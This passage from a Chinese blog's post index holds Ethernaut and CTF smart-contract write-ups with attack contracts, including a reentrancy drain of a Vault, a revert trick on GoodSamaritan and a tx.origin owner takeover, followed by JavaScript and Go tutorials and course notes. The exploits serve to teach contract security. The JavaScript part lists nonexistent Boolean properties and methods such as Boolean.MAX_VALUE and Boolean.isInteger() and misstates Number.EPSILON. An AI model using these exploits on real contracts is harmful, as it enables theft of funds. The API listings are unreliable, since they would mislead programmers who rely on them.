coins            coin.transfer(dest_, 10);        &#125;    &#125;    function transferRemainder(address dest_) external onlyOwner &#123;        // transfer balance left        coin.transfer(dest_, coin.balances(address(this)));    &#125;    function setCoin(Coin coin_) external onlyOwner &#123;        coin = coin_;    &#125;&#125;interface INotifyable &#123;    function notify(uint256 amount) external;&#125;\n先看GoodSamaritan合约，只有一个可调用方法requestDonation，以及在构造函数中创建了我们需要的Wallet和coin，这也限制了无法直接调用Wallet、coin中的方法。\n接着看requestDonation方法，他会通过wallet进行捐赠10金额给msg.sender，那我们进入Wallet中，调用donate10函数会先查看coin中wallet是否还有10金额的余额，如果没有会抛出一个NotEnoughBalance()错误，否则才会调用coin的transfer进行转账，\n接着又进入到coin中，transfer函数中currentBalance = balances[msg.sender]这一句代码也指示了我们需要通过wallet执行transfer，这样currentBalance才是我们的钱包余额。才能继续后面的操作：正常的余额增减，之后对我们传入的地址进行了一个是否是合约的判断：如果是将会转为INotifyable，调用notify函数；如果不是将会正常执行完交易，这就是整个requestDonation的流程，接着看catch的部分：\n如果接受到前面NotEnoughBalance()的错误，将会执行wallet的transferRemainder，而这个函数能够把wallet所有的coin全部转走。\n因此，我们要想一步转走这些余额，就必须通过transferRemainder来实现，也就是：通过一个合约，来正常调用requestDonation，然后在coin中进行transfer的时候，通过接口INotifyable的notify方法返回一个NotEnoughBalance()的错误，这样我们就由transferRemainder再一次进入coin的transfer中，而这一次我们就不需要返回错误，正常交易就行，因此对notify要求有条件性：当提款金额是10的时候抛出错误。这样就ok了\ninterface IGood &#123;    function requestDonation() external returns(bool enoughBalance);    function coin() external returns (address);    function wallet() external returns (address);&#125;interface Icoin &#123;  function balance() external returns (uint256);&#125;contract Hack &#123;  error NotEnoughBalance();  constructor(IGood target) &#123;    target.requestDonation();  &#125;  function notify(uint256 amount) external &#123;    if (amount == 10) &#123;      revert NotEnoughBalance();    &#125;  &#125;&#125;\n\n\nGatekeeperThree任务要求：\n源代码\n// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract SimpleTrick &#123;  GatekeeperThree public target;  address public trick;  uint private password = block.timestamp;  constructor (address payable _target) &#123;    target = GatekeeperThree(_target);  &#125;      function checkPassword(uint _password) public returns (bool) &#123;    if (_password == password) &#123;      return true;    &#125;    password = block.timestamp;    return false;  &#125;      function trickInit() public &#123;    trick = address(this);  &#125;      function trickyTrick() public &#123;    if (address(this) == msg.sender &amp;&amp; address(this) != trick) &#123;      target.getAllowance(password);    &#125;  &#125;&#125;contract GatekeeperThree &#123;  address public owner;  address public entrant;  bool public allowEntrance;  SimpleTrick public trick;  function construct0r() public &#123;      owner = msg.sender;  &#125;  modifier gateOne() &#123;    require(msg.sender == owner);    require(tx.origin != owner);    _;  &#125;  modifier gateTwo() &#123;    require(allowEntrance == true);    _;  &#125;  modifier gateThree() &#123;    if (address(this).balance &gt; 0.001 ether &amp;&amp; payable(owner).send(0.001 ether) == false) &#123;      _;    &#125;  &#125;  function getAllowance(uint _password) public &#123;    if (trick.checkPassword(_password)) &#123;        allowEntrance = true;    &#125;  &#125;  function createTrick() public &#123;    trick = new SimpleTrick(payable(address(this)));    trick.trickInit();  &#125;  function enter() public gateOne gateTwo gateThree &#123;    entrant = tx.origin;  &#125;  receive () external payable &#123;&#125;&#125;\n\n\nSwitch任务要求：\n源代码\n// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Switch &#123;    bool public switchOn; // switch is off    bytes4 public offSelector = bytes4(keccak256(&quot;turnSwitchOff()&quot;));     modifier onlyThis() &#123;        require(msg.sender == address(this), &quot;Only the contract can call this&quot;);        _;    &#125;    modifier onlyOff() &#123;        // we use a complex data type to put in memory        bytes32[1] memory selector;        // check that the calldata at position 68 (location of _data)        assembly &#123;            calldatacopy(selector, 68, 4) // grab function selector from calldata        &#125;        require(            selector[0] == offSelector,            &quot;Can only call the turnOffSwitch function&quot;        );        _;    &#125;    function flipSwitch(bytes memory _data) public onlyOff &#123;        (bool success, ) = address(this).call(_data);        require(success, &quot;call failed :(&quot;);    &#125;    function turnSwitchOn() public onlyThis &#123;        switchOn = true;    &#125;    function turnSwitchOff() public onlyThis &#123;        switchOn = false;    &#125;&#125;\n\n题1pragma solidity 0.8.0;\ncontract Vault {    mapping(address &#x3D;&gt; uint256) public balances;    bool public flag &#x3D; false;\nconstructor() payable&#123;\n    require(msg.value == 100);\n&#125;\n\nfunction deposit() external payable &#123;\n    balances[msg.sender] += msg.value;\n&#125;\n\nfunction withdraw(uint256 _amount) external payable &#123;\n    (bool success, ) = payable (msg.sender).call&#123;value: _amount&#125;(&quot;&quot;);\n    require(success, &quot;[OK]&quot;);\n\n    balances[msg.sender] -= _amount;\n&#125;\n\nfunction solve(uint256 _number) public &#123;\n    require(address(this).balance == 0, &quot;address(this) balance not 0&quot;);\n    require(_number % 3 == 2, &quot;stage01&quot;);\n    require(_number % 5 == 4, &quot;stage02&quot;);\n    require(_number % 7 == 3, &quot;stage03&quot;);\n    flag = true;\n&#125;\n\nfunction balanceOf(address _addr) external view returns(uint256) &#123;\n    return balances[_addr];\n&#125;\n\nfunction canWithdraw(address _user, uint256 _amount) external view returns(bool) &#123;\n    return balances[_user] &gt;= _amount;\n&#125;\n\nfunction isSolved() public view returns(bool) &#123;\n    return flag == true;\n&#125;\n\n}\ncontract Hack {    Vault target;\nconstructor(address _tar) &#123;\n    target = Vault(_tar);\n&#125;\n\nfunction pwn() external payable &#123;\n    target.withdraw(address(target).balance);\n    require(target.isSolved(),&quot;attack step2 failed&quot;);\n&#125;\n\nreceive() external payable &#123; \n    require(address(target).balance == 0,&quot;attack step1 failed&quot;);\n    target.solve(59);\n    target.deposit&#123;value:100&#125;();\n&#125;\n\n}\n题2pragma solidity 0.4.26;\ncontract Jump {\nconstructor() public payable &#123;\n    require(msg.value == 10);\n&#125;\n\nfunction withdraw() private &#123;\n    require(msg.value == 0, &quot;no money&quot;);\n    address(msg.sender).transfer(address(this).balance);\n&#125;\n\nfunction haloWorld() internal&#123;\n    withdraw();\n&#125;\n\nstruct Func &#123;\n    function () internal f;\n&#125;\n\nfunction breakIt() public payable &#123;\n    require(msg.value != 0, &quot;send money!&quot;);\n    Func memory func;\n    func.f = haloWorld;\n    assembly &#123;\n        mstore(func, add(mload(func), callvalue))\n    &#125;\n    func.f();\n&#125;\n\nfunction isSolved() public view returns(bool) &#123;\n    return address(this).balance == 0;\n&#125;\n\n}\n整个合约能够调用的只有breakIt方法，那么主要分析一下这个方法：\nfunction breakIt() public payable &#123;        require(msg.value != 0, &quot;send money!&quot;);        Func memory func;        func.f = haloWorld;        assembly &#123;            mstore(func, add(mload(func), callvalue))        &#125;        func.f();    &#125;\n这个方法首先检查调用者是否发送了以太币，否则会抛出异常。接着，创建了一个Func结构体的实例 func，并将其函数指针f设置为haloWorld函数。然后使用assembly汇编块，尝试将调用者发送的以太币添加到func中的函数指针f上。\n又因为调用breakIt需要支付wei而调用withdraw函数又不需要支付wei，因此通过breakIt进行调用是矛盾的\n","categories":["靶场"],"tags":["题解","Remix","Ethereum","Ethernaut"]},{"title":"Token","url":"/2023/11/15/Ethernaut/token/","content":"任务要求：获取更多的Token  \n源代码：\n// SPDX-License-Identifier: MITpragma solidity ^0.6.0;contract Token &#123;  mapping(address =&gt; uint) balances;  uint public totalSupply;  constructor(uint _initialSupply) public &#123;    balances[msg.sender] = totalSupply = _initialSupply;  &#125;  function transfer(address _to, uint _value) public returns (bool) &#123;    require(balances[msg.sender] - _value &gt;= 0);    balances[msg.sender] -= _value;    balances[_to] += _value;    return true;  &#125;  function balanceOf(address _owner) public view returns (uint balance) &#123;    return balances[_owner];  &#125;&#125;\n解题点：\nfunction transfer(address _to, uint _value) public returns (bool) &#123;    require(balances[msg.sender] - _value &gt;= 0);    balances[msg.sender] -= _value;    balances[_to] += _value;    return true;  &#125;\n这里可以通过下溢 绕过require检测，因为_value和balances[address]都为无符号整数，所以结果会变为2^256-1\n参考：略\n\nsolidity的0.6版本还没内置溢出检测，而在0.8及以后版本中当发生溢出后会进行revert()。\n\n\n","categories":["Ethernaut"],"tags":["题解","Ethereum"]},{"title":"Telephone","url":"/2023/11/15/Ethernaut/telephone/","content":"任务要求：获取合约的所有权  \n源代码：\n// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Telephone &#123;  address public owner;  constructor() &#123;    owner = msg.sender;  &#125;  function changeOwner(address _owner) public &#123;    if (tx.origin != msg.sender) &#123;      owner = _owner;    &#125;  &#125;&#125;\n解题点：\nfunction changeOwner(address _owner) public &#123;    if (tx.origin != msg.sender) &#123;      owner = _owner;    &#125;&#125;\n本题涉及到tx.origin与msg.sender的区别：\n\ntx.origin是发起交易的账户msg.sender是当前直接调用这个合约的即时账户\n\n例如：Alice通过调用合约A来调用合约B，合约A中与合约B中的tx.origin与msg.sender的情形如下：\n\n\n\nAlice\n-&gt;A\n-&gt;B\n\n\n\ntx.origin\nAlice\nAlice\n\n\nmsg.sender\nAlice\nA\n\n\n如果情景是在一个合约下的调用，那么这两者是没有区别的；\n参考：将合约复制到Remix中，再编写一个攻击合约，在Ethernaut上获取实例地址，在remix上连接MetaMask钱包部署攻击合约，通过攻击合约调用实例中的方法改变owner\ncontract Hack &#123;  constructor(address _addr) &#123;    Telephone(_addr).changeOwner(msg.sender);  &#125;&#125;\n\n","categories":["Ethernaut"],"tags":["题解","Ethereum"]},{"title":"JavaScript数据类型","url":"/2022/12/04/JavaScript/JavaScript%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/","content":"数据类型JavaScript拥有动态类型，意味着相同的变量可用作不同的类型。\n变量的数据类型可以使用typeof操作符来获取，语法：typeof variable，variable是变量名。\nvar length = 16; // Numbervar lastName = &quot;L&quot;; // Stringvar x = &#123;firstName:&quot;Lex&quot;, lastName:&quot;L&quot;&#125;; // Object\n值类型值类型也是基本类型，保存在栈内存中，占用空间小，保存的是值本身，可以直接访问。\n值类型包括：字符串、数字、布尔、null、undefined、Symbol\n字符串字符串是存储字符（文本）的变量，字符串可以是引号中的任意文本，可以使用单引号或双引号。\n语法：var str = &quot;Hello World!&quot;，str是变量名，”Hello World!”是字符串值。\nvar str1 = &quot;Hello World!&quot;;var str2 = &#x27;Hello World!&#x27;;\n\n你可以使用索引位置来访问字符串中的每个字符，索引从0开始。\n字符串可以是变量，也可以是常量，字符串常量是不可改变的，一旦创建，无法改变；字符串变量是可变的，可以通过重新赋值来改变字符串的值；同时可以使用new关键字将字符串定义为一个对象：\nvar str1 = &quot;Hello World!&quot;;var str2 = &quot;Hello World!&quot;;str1 = &quot;Hello China!&quot;;var str = new String(&quot;Hello World!&quot;);typeof str  //返回Objecttypeof str1 //返回String\n你可以在字符串中使用引号，只要不匹配包围字符串的引号即可，如：\nvar str1 = &quot;Hello &#x27;World&#x27;!&quot;;\n或者在字符串中添加转义字符\\，来使用引号或其他特殊字符，如：\\（反斜杠） &#39;（单引号） &quot;（双引号） \\n（换行） \\r（回车） \\t（制表符） \\b（退格） \\f（换页符） \\v（垂直制表符）\n字符串内置属性，针对字符串对象；原始值字符串没有属性和方法。\n\nconstructor返回创建字符串属性的函数\nlength返回字符串的长度\nprototype向对象添加属性和方法\nstr.charAt(index)返回指定索引位置的字符\nstr.charCodeAt(index)返回指定索引位置字符的Unicode编码\nstr.concat(string1,string2,...,stringX)连接两个或多个字符串，返回连接后的字符串\nstr.indexOf(searchValue,startIndex)返回字符串中指定值第一次出现的索引值，如果找不到返回-1，startIndex是开始查找的位置，默认为0\nstr.lastIndexOf(searchValue,startIndex)从后向前搜索字符串，返回指定值的索引值，如果找不到返回-1，startIndex是开始查找的位置，默认为字符串的长度\nstr.localeCompare(compareString)用本地特定的顺序来比较两个字符串，返回一个数字表示两个字符串的比较结果\nstr.match(regexp)找到一个或多个正则表达式的匹配，返回匹配的字符串数组\nstr.replace(regexp|substr,newSubStr|function)在字符串中查找匹配的子串，然后用新的子串替换它，并返回替换后的字符串\nstr.search(regexp)检索与正则表达式相匹配的值，返回第一个匹配的索引值，如果没有找到匹配的值，返回-1\nstr.slice(startIndex,endIndex)提取字符串的片断，并在新的字符串中返回被提取的部分，startIndex是开始提取的位置，endIndex是结束提取的位置（不包含），如果省略endIndex，则提取到字符串末尾\nstr.split(separator,limit)把字符串分割为字符串数组，separator是分隔符，limit是分割次数，如果省略，则分割所有元素\nstr.substr(startIndex,length)从起始索引号提取字符串中指定数目的字符，startIndex是开始提取的位置，length是要提取的字符数，如果省略，则提取从startIndex到字符串末尾的所有字符\nstr.substring(startIndex,endIndex)提取字符串中两个指定的索引号之间的字符，startIndex是开始提取的位置，endIndex是结束提取的位置（不包含），如果省略endIndex，则提取到字符串末尾\nstr.toLocaleLowerCase()根据主机的语言环境把字符串转换为小写，返回字符串\nstr.toLocaleUpperCase()根据主机的语言环境把字符串转换为大写，返回字符串\nstr.toLowerCase()把字符串转换为小写\nstr.toString()返回字符串\nstr.toUpperCase()把字符串转换为大写\nstr.trim()去除字符串两边的空白字符\nstr.valueOf()返回某个字符串对象的原始值\n\n模版字符串模板字符串是一种方便的字符串语法，可以在字符串中嵌入表达式和变量。\n使用反引号`作为字符串的定界符分隔，允许多行字符串，带嵌入式表达式的字符串插值。\n可以包含占位符，占位符使用$&#123;expression&#125;来表示，expression是一个JavaScript表达式,被传递给一个函数来处理（默认是转义字符串，只执行字符串替换，然后拼接到一个字符串中）。\n` string text `` string text line 1  string text line 2 `` string text $&#123;expression&#125; string text `\nvar name &#x3D; “Lex”;var str &#x3D; Hello $&#123;name&#125;;\n&gt; 我们一般不使用String对象，它会拖慢执行速度，并在使用时产生一些特别注意，例如：&gt; 更多方法实例参见：[JavaScript String对象]()### 数字JavaScript只有一种数字类型，数字可以带小数点，也可以不带，也可以使用指数计数法（科学计数法），语法：` var num = 3.14 `，num是变量名，3.14是数字值。```javascriptvar num1 = 3.14;var num2 = 3;var num3 = 123e5;   // 12300000var num4 = 123e-5;  // 0.00123\n\n更多的数字知识将在后面的章节中详细讲解。\n数字方法：\n\nnum.toString()把数字转换为字符串，使用指定的基数，返回字符串\nnum.toExponential()把数字转换为指数计数法，返回字符串\nnum.toFixed()把数字转换为字符串，结果的小数点后有指定位数的数字，返回字符串\nnum.toPrecision()把数字格式化为指定的长度，返回字符串\nNumber()把对象的值转换为数字\nparseInt()解析一个字符串，并返回一个整数\nparseFloat()解析一个字符串，并返回一个浮点数\nisNaN()检查是否是非数字值\nisFinite()检查是否是有限值\ntoLocaleString()把数字转换为字符串，使用本地数字格式顺序\nvalueOf()返回一个 Number 对象的原始数字值\nNumber.MAX_VALUE可表示的最大的数\nNumber.MIN_VALUE可表示的最小的数\nNumber.POSITIVE_INFINITY正无穷大\nNumber.NEGATIVE_INFINITY负无穷大\nNumber.NaN非数字值\nNumber.EPSILON可表示的最小的数\nNumber.MAX_SAFE_INTEGER可表示的最大的整数\nNumber.MIN_SAFE_INTEGER可表示的最小的整数\nNumber.isInteger()判断是否是整数\nNumber.isSafeInteger()判断是否是安全整数\n\n布尔布尔值只能是true或false，语法：var bool = true，bool是变量名，true是布尔值。\nvar bool1 = true;var bool2 = false;\n\n布尔方法：\n\nBoolean()把对象的值转换为布尔值\nvalueOf()返回一个 Boolean 对象的原始布尔值\ntoString()把逻辑值转换为字符串，并返回结果\ntoLocaleString()把逻辑值转换为字符串，并返回结果\nBoolean.MAX_VALUE可表示的最大的数\nBoolean.MIN_VALUE可表示的最小的数\nBoolean.POSITIVE_INFINITY正无穷大\nBoolean.NEGATIVE_INFINITY负无穷大\nBoolean.NaN非数字值\nBoolean.EPSILON可表示的最小的数\nBoolean.MAX_SAFE_INTEGER可表示的最大的整数\nBoolean.MIN_SAFE_INTEGER可表示的最小的整数\nBoolean.isInteger()判断是否是整数\nBoolean.isSafeInteger()判断是否是安全整数\nBoolean.prototypeBoolean对象的原型对象\nBoolean.prototype.constructor返回对创建此对象的 Boolean 函数的引用\nBoolean.prototype.toString()返回一个表示该对象的字符串\nBoolean.prototype.valueOf()返回一个 Boolean 对象的原始布尔值\nBoolean.prototype.toLocaleString()返回一个表示该对象的字符串\nBoolean.prototype[@@toStringTag]返回一个表示该对象的字符串\nBoolean.prototype[@@unscopables]返回一个表示该对象的字符串\nBoolean.prototype.toSource()返回一个表示该对象的字符串\nBoolean.prototype.__proto__允许您为对象添加属性和方法\nBoolean.prototype.__defineGetter__()绑定一个函数到一个属性的 getter\nBoolean.prototype.__defineSetter__()绑定一个函数到一个属性的 setter\nBoolean.prototype.hasOwnProperty()返回一个布尔值，指示对象自身属性中是否具有指定的属性\n\nnull和undefinednull和undefined都表示没有值。可以通过将值设置为null来清空对象。\nvar x = null;var y;\nnull和undefined的区别：\n\nnull是一个表示”空”的对象，转为数值时为0；undefined是一个表示”此处无定义”的原始值，转为数值时为NaN\nnull表示”没有对象”，即该处不应该有值；undefined表示”缺少值”，就是此处应该有一个值，但是还没有定义\nnull的类型是object，undefined的类型是undefined\nnull比较特殊，它是一个空对象指针，typeof null返回object\nundefined表示”缺少值”，就是此处应该有一个值，但是还没有定义，typeof undefined返回undefined\n\n引用类型引用数据类型又是对象类型，保存在堆内存中，占用空间大，保存的是值的地址，需要通过地址访问。\n数组数组是存储多个值的变量，数组中的值可以是任意数据类型，语法：var arr = [1,2,3]，arr是变量名，[1,2,3]是数组值。\nvar arr1 = [1,2,3];var arr2 = [&quot;a&quot;,&quot;b&quot;,&quot;c&quot;];var arr3 = [1,&quot;a&quot;,true];\n\n更多的数组知识将在后面的章节中详细讲解。\n对象对象是复杂的数据类型，对象可以拥有多个值，对象的属性由键值对的形式定义，属性与属性间逗号分隔语法：var obj = &#123;name:&quot;Lex&quot;,age:21&#125;，obj是变量名，{name:”Lex”,age:21}是对象值。\nvar obj = &#123;name:&quot;Lex&quot;,age:21&#125;;\n\n更多的对象知识将在后面的章节中详细讲解。\n\nJavaScript 变量均为对象。当您声明一个变量时，就创建了一个新的对象。\n\n","categories":["教程"],"tags":["JavaScript"]},{"title":"JavaScript对象","url":"/2022/12/04/JavaScript/JavaScript%E5%AF%B9%E8%B1%A1/","content":"JavaScript对象对象是拥有属性和方法的数据\n在JavaScript中，几乎所有的事物都是对象。\n对象也是一个变量，但对象可以包含多个值（多个变量），每个值以 name:value对呈现\n对象定义可以使用字符来定义和创建对象\nvar person = &#123;firstName:&quot;Lex&quot;, lastName:&quot;L&quot;, age:21&#125;;\n定义对象时可以跨越多行，空格和换行不是必须的\nvar person = &#123;    firstName:&quot;Lex&quot;,    lastName:&quot;L&quot;    age:21&#125;\n\n对象属性键值对通常写法为name : value(键与值以冒号分割)。\n属性由逗号分隔，最后一个属性后面可以没有逗号。\n键值对在JavaScript对象通常称为对象属性。\n访问对象属性实例：\nvar person = &#123;    firstName:&quot;Lex&quot;,    lastName:&quot;L&quot;,    age:21&#125;\n可以使用以下语法访问对象属性：\n\nperson.lastName\nperson[&quot;lastName&quot;]\n\n对象方法对象的方法定义了一个函数，并作为对象的属性存储。\n对象方法通过添加 () 调用 (作为一个函数)。\n实例：\nvar person = &#123;    firstName:&quot;Lex&quot;,    lastName:&quot;L&quot;,    age:21,    fullName:function() &#123;        return this.firstName + &quot; &quot; + this.lastName;    &#125;&#125;name = person.fullName() //该语句访问了person对象的fullName()方法\n同时你可以访问person对象的fullName属性，他将作为一个定义函数的字符串返回：name = person.fullName\n访问对象方法创建语法：\nmethodName : function() &#123;    //your code&#125;\n使用以下语句访问对象方法：\n\nobjectName.methodName()\n\n\n在上面的实例中，fullName() 是作为 person 对象的一个方法， fullName 是作为一个属性。如果使用 fullName 属性，不添加(), 它会返回函数的定义\n\n","categories":["教程"],"tags":["JavaScript"]},{"title":"JavaScript函数","url":"/2022/12/04/JavaScript/JavaScript%E5%87%BD%E6%95%B0/","content":"JavaScript函数函数是由事件驱动的或者当它被调用时执行的可重复使用的代码块。\n语法函数就是花括号中的代码块，使用关键词 function：\nfunction functionname()&#123;    // 执行代码&#125;\n当调用该函数时，会执行函数内的代码。\n\n可以在事件发生时直接调用函数（如：用户点击按钮时），并且可由 JavaScript 在任何位置进行调用。JavaScript 对大小写敏感。关键词function必须是小写的，并且必须以与函数名称相同的大小写来调用函数。\n\n传递参数在调用函数时，可以向其传递值，这些值也称为参数\n您可以发送任意多的参数，通过逗号 (,) 分隔：\nmyFunction(argument1,argument2)在声明函数时，请把参数作为变量来声明：\nfunction myFunction(var1,var2) &#123;    //your code&#125;\n变量和参数必须以一致的顺序出现。第一个变量就是第一个被传递的参数的给定的值，以此类推。\n传递返回值希望函数将值返回调用它的地方。\n语法：使用return语句\nfunction myFunction(var1,var2) &#123;    var x=5;    return x;&#125;\n上面的函数会返回值5  \n你可以使返回值基于传递给函数的值。\n\n在仅想退出函数时，也可使用return语句。返回值时可选的：return\n\n作用域作用域是可访问变量的集合\n\n局部作用域\n  变量在函数内声明，变量为局部变量，具有局部作用域。\n  因为局部变量只作用于函数内，所以不同的函数可以使用相同的名称的变量\n  局部变量在函数运行完毕后会被删除\n\n全局作用域\n  在函数外声明的变量，变量为全局变量，具有全局作用域。\n  全局变量具有全局作用域，网页中所用脚本和函数均可使用。\n\n\n局部变量在 JavaScript 函数内部声明的变量（使用 var）是局部变量，所以只能在函数内部访问它。（该变量的作用域是局部的）。\n您可以在不同的函数中使用名称相同的局部变量，因为只有声明过该变量的函数才能识别出该变量。\n只要函数运行完毕，本地变量就会被删除。\n全局变量在函数外声明的变量是全局变量，网页上的所有脚本和函数都能访问它。\n所有数据变量都属于window对象\n\n如果变量在函数内没有声明（使用关键字），该变量为全局变量（作为window的一个属性）\n\n变量的生存周期JavaScript 变量的生命期从它们被声明时开始。\n局部变量会在函数运行以后被删除。\n全局变量会在页面关闭后被删除。\n\n如果把值直接赋给未声明的变量，该变量将自动作为window的一个属性。为全局变量，即使在函数内部。例：myName=&quot;Lex&quot;此时将声明window的一个属性 myName非严格模式下给未声明变量赋值创建的全局变量，是全局对象的可配置属性，可以删除。示例：\nvar var1 = 1var2 = 2console.log(var1) // 1console.log(var2) // 2delete var1 // false console.log(var1) // 1delete var2 // true console.log(var2) // undefined\n\n","categories":["教程"],"tags":["JavaScript"]},{"title":"JavaScript简介","url":"/2022/12/04/JavaScript/JavaScript%E7%AE%80%E4%BB%8B/","content":"简介Web基础，一种轻量级的编程语言，可插入HTML页面的编程代码，由浏览器执行。\nJavaScript使用内部JavaScript在HTML文档中插入JavaScript代码，使用&lt;script&gt;标签\n&lt;script&gt;    document.getElementById(&quot;demo&quot;).innerHTML = &quot;My First JavaScript&quot;;&lt;/script&gt;\nJavaScript语句会在页面加载时执行，通常放在&lt;body&gt;或&lt;head&gt;元素中，\n外部JavaScript在HTML文档中插入外部JavaScript文件，外部JavaScript文件通常包含被多个网页使用的代码，文件扩展名是.js，在使用时需使用&lt;script&gt;标签，src属性指向外部文件的URL\n&lt;script src=&quot;myScript.js&quot;&gt;&lt;/script&gt;\n\n显示数据JavaScript可以通过不同的方式来输出数据，但JavaScript没有任何打印或显示的函数，可以使用以下几种方式来显示数据：\n\nwindow.alert()弹出警告框\ndocument.wirte()方法将内容写到HTML文档中\ninnerHTML写入到HTML元素\nconsole.log()写入到浏览器的控制台\n\nwindow.alert()window.alert()方法弹出警告框，通常用于调试\nwindow.alert(&quot;Hello World!&quot;);\n\ndocument.write()document.write()方法将内容写到HTML文档中，通常在文档加载时使用\ndocument.write(&quot;Hello World!&quot;);\n如果在文档加载后使用document.write()方法，会覆盖整个文档\ninnerHTMLinnerHTML属性用于获取或替换HTML元素的内容，语法：document.getElementById(id).innerHTML = new HTML，id是HTML元素的id属性值，new HTML是新的HTML内容\ndocument.getElementById(&quot;demo&quot;).innerHTML = &quot;Hello World!&quot;;\n\nconsole.log()console.log()方法将内容写到浏览器的控制台，通常用于调试\nconsole.log(&quot;Hello World!&quot;);\n\n在程序中经常调试可以查找及减少bug。\n","categories":["教程"],"tags":["JavaScript"]},{"title":"Golang","url":"/2023/04/28/Golang/Golang/","content":"前言为了解决在软件开发过程中的一些令人头疼的问题并尝试设计一门全新的编程语言，且不是用奇怪的语法和晦涩难懂的概念来从根本上推翻已有的编程语言。\nGo语言就在这样的环境下诞生了，它让人感觉像是Python或Ruby这样的动态语言，却又拥有像C或者Java这类语言的高性能和安全性。\n它提倡通过接口来面向对象编程，通过goroutine和channel来支持并发和并行编程。\n起源与发展Go语言最初由Google开发，于2007年11月发布。\nGo语言的官方网站是golang.org。这个站点采用Python作为前端，并且使用Go语言自带的工具godoc运行在Google App Engine上来作为Web服务器提供文本内容，并且在首页上还有一个Go Playground，可以在你的浏览器中编译并运行一些简单的Go代码。\nGO语言特色在GO语言出现以前，开发者总是面临一些抉择：究竟是使用执行速度快但是编译速度并不理想的语言（如：C++），还是使用编译速度较快但执行效率不佳的语言（如：.NET、Java），或者说开发难度较低但执行速度一般的动态语言呢？\n显然，GO语言在这3个条件之间做到了最佳的平衡。Go 语言的主要目标是将静态语言的安全性和高效性与动态语言的易开发性进行有机结合，达到完美平衡；另一个目标是对于网络通信、并发和并行编程的极佳支持，从而更好地利用大量的分布式和多核的计算机。\n\n简洁、快速、安全\n从本质上实现并发编程\n使用静态类型，执行速度非常快\n作为强类型语言，隐式的类型转换是不被允许的Go语言通过改善或去除在C、C++或Java中一些特性来使开发更加便利，例如变量的默认初始化，内存分配和自动回收。\n\n在声明和包的设计方面，Go语言受到Pascal、Modula和Oberon系语言的影响；\n依赖管理是现今软件开发的一个重要组成部分，人们越来越需要一门具有严格的、简洁的依赖关系分析系统从而能够快速编译的编程语言。这正是 Go 语言采用包模型的根本原因，这个模型通过严格的依赖关系检查机制来加快程序构建的速度，提供了非常好的可量测性。\nGo语言通过减少关键字的数量（25 个）来简化编码过程中的混乱和复杂度。\n所有的行为都突出一个宗旨：减少不必要的编码工作使代码更加简洁，从而比传统的面向对象语言更容易阅读和理解。\nGO用途Go 语言的主要目标是将静态语言的安全性和高效性与动态语言的易开发性进行有机结合，达到完美平衡；\n用于实现一般目标的语言，例如对文本的处理，前端展现，像脚本一样使用…\n另一个目标是对于网络通信、并发和并行编程的极佳支持，从而更好地利用大量的分布式和多核的计算机。\nGo 语言被设计成一门应用于搭载 Web 服务器，存储集群或类似用途的巨型中央服务器的系统编程语言。对于高性能分布式系统领域而言，Go 语言无疑比大多数其它语言有着更高的开发效率。\n\n记住，学习一门新语言的最佳方式就是实践，运行它的代码，修改并尝试更多的方案。\n\n\n了解微服务的演进历史及它的优缺点\n\n了解微服务的设计方法\n\n了解微服务中 RPC 的底层原理\n\n多集群、多租户的概念\n\n\n学习和工作中的痛点\n\n不理解微服务的服务角色：API Gateway、BFF 还是 Service？\n\n不知道怎么做微服务拆分\n\n不理解 RPC 的原理，不知道如何进行微服务 RPC 框架的选型\n\n\n详细内容\n\n微服务的原理、概念，以及微服务的实现细节\n\nAPI Gateway、BFF、Service 等概念精讲\n\n微服务通讯 RPC 框架的细节和选型\n\n多集群、多租户解决全链路压测、多测试环境等\n\n\n&#x3D;&#x3D;&#x3D;5. 了解 Go 语言中 error 的处理方法\n\n了解 Go 语言中业务错误的处理方法\n\n学习和工作中的痛点\n\nerror 的处理复杂，不会正确使用\n\n业务错误定义和 error 整合难度较高\n\n\n详细内容\n\nGo 语言中的 error 处理实践：检查错误、定义错误、追加上下文\n\nGo 项目中的业务错误码如何结合 error 的最佳实践\n\n了解 Go 语言中的 Memory Model\n\n了解 Go 语言的并发特性并发编程模式：Timeout、Pipeline、Cancellation、Fanout、errgroup 等模式\n\n了解 Go 语言中 Context 的原理并掌握其使用方法\n\n\n学习和工作中的痛点\n\n搞不清楚 Go 中内存模型和同步语义\n\n无法熟练使用基于 channel 通讯方式的并行编程模式\n\n不明白 Context 传播式传递有什么意义\n\n\n详细内容\n\n内存模型：Happens Before、同步语义、channel 通讯、锁\n\n利用 channel 完成并行开发的设计模式，包含超时控制、管道、扇出、errgroup 并发\n\n使用 Go 标准库 Context 的原理和最佳实践，包含超时控制、元数据传递、生命周期控制\n\n\n&#x3D;&#x3D;&#x3D;\n\n了解 Go 项目中良好的项目目录组织原则和规范\n\n了解 Go 项目中 API 的设计方法和规范\n\n了解 Go 项目中 Package 的管理和设计方法\n\n了解 Go 项目中的单元测试方法\n\n\n学习和工作中的痛点\n\n不知道怎么做 Go 项目的标准化管理\n\n总是设计出各种不合理的 API\n\n不知道怎么做包管理\n\n\n详细内容\n\n良好的 Go 项目中的分层目录结构组织和代码规范\n\nGo 项目中 API 的设计原则和方法：定义、状态和业务错误码处理\n\nGo 项目中包的设计和最佳实践、go mod 的使用\n\ngo test 工具链的使用方法、单元测试的最佳实践以及 Mock 技术\n\n\n本周领教直播内容\n\nGo 项目布局实践\n\nProtobuf 和 Wire 入门\n\n中间件 API 设计的两种思路\n\n写好 go 测试: mock、test suite 和 benchmark test\n\n\n&#x3D;&#x3D;&#x3D;\n\n掌握可用性设计的最佳实践\n\n了解可用性设计的几大关键点：隔离、超时控制、过载保护、限流、容错&amp;重试\n\n\n学习和工作中的痛点\n\n不知道如何设计高可用的分布式服务\n\n不清楚如何提升服务自愈能力\n\n\n详细内容\n\n微服务的隔离实现，以及架构设计中的隔离实现\n\n进程内超时控制和跨进程超时控制\n\n程序自保护避免过载，抛弃一定的流量完成自适应限流\n\n单机限流、多租户场景的分布式限流\n\n节点故障的容错逻辑、重试容错的策略和设计\n\n\n&#x3D;&#x3D;&#x3D;\n\n熟练掌握 Go 语言中的 TCP 网络编程\n\n熟练掌握 Go 语言中的 HTTP 网络编程\n\n\n学习和工作中的痛点\n\n不知道怎么用 Go 实现高性能的 TCP Server\n\nHTTP 框架有不少，但不知道怎样做选型\n\n不会针对业务需求对 HTTP 框架做针对性的扩展\n\n\n详细内容\n\n结合 goim 项目了解 Go 